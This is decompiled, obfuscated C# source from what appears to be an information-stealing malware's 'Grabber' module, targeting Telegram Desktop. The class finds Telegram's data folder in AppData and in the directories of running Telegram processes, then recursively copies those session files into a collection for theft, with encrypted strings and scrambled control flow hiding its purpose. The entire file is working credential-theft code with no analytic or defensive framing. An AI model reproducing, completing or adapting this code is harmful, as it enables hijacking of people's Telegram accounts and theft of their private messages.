using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;

namespace Application.Grabber.Applications
{
	// Token: 0x0200003E RID: 62
	internal class Telegram
	{
		// Token: 0x1700004E RID: 78
		// (get) Token: 0x060001FF RID: 511 RVA: 0x0000D7A8 File Offset: 0x0000B9A8
		// (set) Token: 0x06000200 RID: 512 RVA: 0x0000D7BC File Offset: 0x0000B9BC
		public static int Count { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x06000201 RID: 513 RVA: 0x0000D7D0 File Offset: 0x0000B9D0
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static List<FileObject> Execute()
		{
			List<FileObject> list;
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					switch (num)
					{
					case 0:
						if (list.Count > 0)
						{
							Telegram.Count++;
							goto IL_139;
						}
						goto IL_139;
					case 1:
						if (list.Count > 0)
						{
							Telegram.Count++;
							goto IL_17B;
						}
						goto IL_17B;
					case 2:
						goto IL_17F;
					case 3:
					{
						list = new List<FileObject>();
						string text = delegate0d4.f0000c6(delegate0d0.f0000ba(Paths.AppDataPath, c0000c0.m00000f("ÍU(\bÃ\u000eAVÁR\nI{ü9\bæÞ\u001a\u0002L°{")), new object[0]);
						if (delegate0d2.f0000be(text))
						{
							list.AddRange(Telegram.CopyAll(text, c0000c0.m00000f("Ðq=\bÏ\nRCÅ\u001d _TÃ(\vóå\u001c\a@\u0098^È5ß\u0002²cë\u0086Ån^%\u0002")));
							num = delegate0da.f0000d7(0);
							continue;
						}
						goto IL_139;
					}
					}
					break;
					IL_17F:
					int num2;
					Process[] processesByName;
					if (num2 >= processesByName.Length)
					{
						return list;
					}
					string directoryName = Path.GetDirectoryName(processesByName[num2].MainModule.FileName);
					if (!directoryName.Contains(Paths.AppDataPath))
					{
						list.AddRange(Telegram.CopyAll(delegate0d0.f0000ba(directoryName, c0000c0.m00000f("Íu)\u0005Ò\b")), delegate0101.f000126(c0000c0.m00000f("Ðq=\bÏ\nRCÅ\u001d _TÃ(\vóå\u001c\a@\u0098IÈ Í\u001e±yç\u0098\u0086`"), num2)));
						num = delegate0da.f0000d7(-1);
						continue;
					}
					goto IL_17B;
					IL_139:
					processesByName = Process.GetProcessesByName(c0000c0.m00000f("Åd!\u0001Á\u001bRZ"));
					num2 = 0;
					num = delegate0da.f0000d7(-2);
					continue;
					IL_17B:
					num2++;
					goto IL_17F;
				}
			}
			return list;
		}

		// Token: 0x06000202 RID: 514 RVA: 0x0000D968 File Offset: 0x0000BB68
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static List<FileObject> CopyAll(string path, string savePath)
		{
			List<FileObject> list = new List<FileObject>();
			foreach (string text in delegate0e2.f0000e2(path, c0000c0.m00000f("»"), SearchOption.AllDirectories))
			{
				FileObject fileObject = Telegram.CopyFile(text, delegate0d0.f0000ba(savePath, text.Replace(path, c0000c0.m00000f(""))));
				if (fileObject != null)
				{
					list.Add(fileObject);
				}
			}
			return list;
		}

		// Token: 0x06000203 RID: 515 RVA: 0x0000D9E8 File Offset: 0x0000BBE8
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static FileObject CopyFile(string path, string savePath)
		{
			FileObject result = null;
			if (!path.Contains(c0000c0.m00000f("är(\u0016ù\rRCÍ")) && !path.Contains(c0000c0.m00000f("ôl\"\u000eÏ")))
			{
				byte[] content = delegate0f8.f000112(path);
				result = new FileObject(savePath, content);
			}
			return result;
		}

		// Token: 0x06000204 RID: 516 RVA: 0x0000DA34 File Offset: 0x0000BC34
		[MethodImpl(MethodImplOptions.NoInlining)]
		public Telegram()
		{
		}

		// Token: 0x06000205 RID: 517 RVA: 0x0000DA3C File Offset: 0x0000BC3C
		// Note: this type is marked as 'beforefieldinit'.
		[MethodImpl(MethodImplOptions.NoInlining)]
		static Telegram()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
		}

		// Token: 0x0400009D RID: 157
		[CompilerGenerated]
		private static int f00001a;
	}
}
